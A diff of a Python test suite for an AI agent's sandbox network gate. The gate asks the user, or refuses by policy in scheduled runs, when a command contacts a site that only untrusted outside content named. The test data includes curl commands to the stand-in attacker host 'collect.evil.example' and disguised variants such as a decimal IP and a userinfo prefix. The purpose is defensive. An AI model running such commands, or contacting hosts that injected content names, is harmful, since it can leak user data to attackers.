@@ -3,11 +3,13 @@
 so `curl https://collect.evil.example` asks before it runs instead of failing at the proxy. The proxy stays the real
 enforcement (tests/server/sbx/test_net_a_proxy.py); the card after a refused run is NET-a's (test_net_a_gate.py).
 
-- A yes runs the command as usual; a no doesn't run it, and the model reads why.
+- A yes runs the command as usual; a no runs it without the grant (it may only mention the URL), and the model reads
+  why: a connection to the site is refused at the proxy.
 - No card for a host that is named, listed, a package registry or unknown, nor with the switch off, nor for one this
   conversation already allowed; nor for a name that is no URL's host (a file name `main.py`, which outside content
   may name too).
-- In a scheduled fire nobody can answer: no card, refused by policy and listed, and the note says the Inbox.
+- In a scheduled fire nobody can answer: no card, refused by policy and listed; the command runs without the site, and
+  the note names Settings' list (a scheduled run's Inbox entry offers no grant).
 - The card says what was blocked, why, and what to do (net-design §4, §12).
 """
 import json
@@ -63,6 +65,7 @@ async def _rows():
 @pytest.mark.parametrize("command, target", [
     (CURL, SITE),
     ("curl -s http://1572395042/in", "network:93.184.216.34"),       # an address no one named, after outside content
+    ("curl -s https://user@Collect.Evil.Example./in", SITE),         # userinfo skipped; one spelling (normalize)
 ])
 async def test_a_command_that_names_a_site_only_outside_content_named_asks_before_it_runs(
         execution_db, monkeypatch, command, target):
@@ -77,12 +80,16 @@ async def test_a_command_that_names_a_site_only_outside_content_named_asks_befor
         assert await permission_store.find_grant(db, "c1", None, "network", target)
 
 
-async def test_a_no_up_front_runs_nothing_and_says_why(execution_db, monkeypatch):
+@pytest.mark.parametrize("command", [CURL, "echo https://collect.evil.example/x >> notes.txt"])
+async def test_a_no_up_front_runs_the_command_without_the_grant_and_says_so(execution_db, monkeypatch, command):
+    """#949 review 1: a command that only mentions the URL must run; a connection to the site is refused at the proxy
+    (tests/server/sbx/test_net_a_proxy.py)."""
     asker = _Asker(approve=False)
-    ex, result = await _after_outside_content(monkeypatch, CURL, asker=asker)
-    assert len(asker.frames) == 1 and ex.runs == [] and result["ok"] is False
-    assert result["error"].startswith("collect.evil.example was refused: it appeared only in outside content")
-    assert "The user said no to:" in result["error"]
+    ex, result = await _after_outside_content(monkeypatch, command, asker=asker)
+    assert len(asker.frames) == 1 and ex.runs == [(False, False)] and result["ok"]
+    note = result["network_note"]
+    assert note.startswith("collect.evil.example was refused: it appeared only in outside content")
+    assert "The user said no to:" in note and "The command ran without it" in note
     async with execution_db() as db:
         assert await permission_store.find_grant(db, "c1", None, "network", SITE) is None
 
@@ -135,20 +142,21 @@ async def test_no_card_for_a_command_that_runs_outside_the_sandbox(execution_db,
     assert [frame["target"] for frame in asker.frames] == ["network:*"] and ex.runs == [(True, False)]
 
 
-async def test_a_site_this_conversation_allowed_is_not_asked_again(execution_db, monkeypatch):
+@pytest.mark.parametrize("command", [CURL, "curl -s https://user@Collect.Evil.Example./in"])
+async def test_a_site_this_conversation_allowed_is_not_asked_again(execution_db, monkeypatch, command):
     async with execution_db() as db:
         await permission_store.add_grant(db, "c1", "", "network", SITE, call_id="card-1")
         await db.commit()
     asker = _Asker()
-    ex, result = await _after_outside_content(monkeypatch, CURL, asker=asker)
+    ex, result = await _after_outside_content(monkeypatch, command, asker=asker)
     assert asker.frames == [] and ex.runs == [(False, False)] and result["ok"]
     assert await _rows() == []          # the grant's ledger row is the proxy's, when a connection uses it (`_granted`)
 
 
 # ── a scheduled fire ─────────────────────────────────────────────────────────
 
-async def _fire(monkeypatch, *, read: bool) -> tuple[_Exec, dict]:
-    """`CURL` in a scheduled fire of c1, whose own turn read the page when `read`; c1 read it before either way."""
+async def _fire(monkeypatch, *, read: bool, command: str = CURL) -> tuple[_Exec, dict]:
+    """`command` in a scheduled fire of c1, whose own turn read the page when `read`; c1 read it before either way."""
     net_policy.note_outside("c1", PAGE)
     monkeypatch.setattr(command_sandbox, "available", lambda: True)
     ex = _Exec()
@@ -156,21 +164,25 @@ async def _fire(monkeypatch, *, read: bool) -> tuple[_Exec, dict]:
         with untrusted.carried(read, text=PAGE), command_gate.scheduled_fire("c1"):
             seen = untrusted.track_turn("c1")
             try:
-                return ex, await _dispatch(monkeypatch, CURL, ex, None)
+                return ex, await _dispatch(monkeypatch, command, ex, None)
             finally:
                 untrusted.end_turn(seen)
     finally:
         command_sandbox._reset_for_tests()
 
 
-async def test_in_a_fire_there_is_no_card_and_the_command_is_refused_and_listed(execution_db, monkeypatch):
-    """A fire whose own turn read nothing runs online, judged at the proxy. A grant counts for nothing there (S1)."""
+@pytest.mark.parametrize("command", [CURL, "echo https://collect.evil.example/x"])
+async def test_in_a_fire_there_is_no_card_and_the_command_runs_without_the_site(execution_db, monkeypatch, command):
+    """A fire whose own turn read nothing runs online, judged at the proxy. A grant counts for nothing there (S1): the
+    card is refused by policy and listed, and the command runs without the site (#949 review 1)."""
     async with execution_db() as db:
         await permission_store.add_grant(db, "c1", "", "network", SITE, call_id="card-1")
         await db.commit()
-    ex, result = await _fire(monkeypatch, read=False)
-    assert ex.runs == [] and result["ok"] is False
-    assert "listed in the Inbox" in result["error"] and "can allow it for this conversation" not in result["error"]
+    ex, result = await _fire(monkeypatch, read=False, command=command)
+    assert ex.runs == [(False, False)] and result["ok"]
+    note = result["network_note"]
+    assert "Settings › Sandbox › Sites" in note and "The command ran without it" in note
+    assert "can allow it for this conversation" not in note and "Inbox" not in note and "was not done" not in note
     assert [(r.decided_by, r.decision, r.target) for r in await _rows()] == [("policy", "deny", SITE)]
 
 
@@ -180,12 +192,14 @@ async def test_a_fire_whose_turn_read_outside_content_runs_offline_and_asks_noth
     assert ex.runs == [(False, True)] and await _rows() == []
 
 
-def test_the_refusal_note_with_nobody_to_ask_points_to_the_inbox():
+def test_the_refusal_note_with_nobody_to_ask_points_to_settings():
+    """#949 review 1: a scheduled run's Inbox entry offers no grant, so the note names Settings' list."""
     with permissions.asking_with(None):
         alone = net_policy.refusal_note(["collect.evil.example"])
     with permissions.asking_with(_Asker()):
         asked = net_policy.refusal_note(["collect.evil.example"])
-    assert "listed in the Inbox" in alone and "can allow it for this conversation" not in alone
+    assert alone.endswith("Nobody could be asked in this run; the user can add it in Settings › Sandbox › Sites.")
+    assert "can allow it for this conversation" not in alone and "Inbox" not in alone
     assert asked.endswith("The user can allow it for this conversation.")
 
 
